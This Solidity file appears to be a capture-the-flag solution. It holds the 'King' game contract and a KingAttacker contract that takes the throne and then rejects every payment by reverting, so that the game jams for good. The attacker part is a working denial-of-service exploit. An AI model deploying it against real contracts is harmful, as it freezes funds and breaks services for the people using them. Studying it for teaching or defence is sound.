// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return payable(king);
  }
}

contract KingAttacker {
  receive() external payable {
    revert("nope");
  }

  fallback() external payable {
    revert("nope");
  }

  function pwn(address payable _to) public payable {
    (bool sent, ) = _to.call{value: msg.value}("");
    require(sent, "pwnage failed");
  }
}
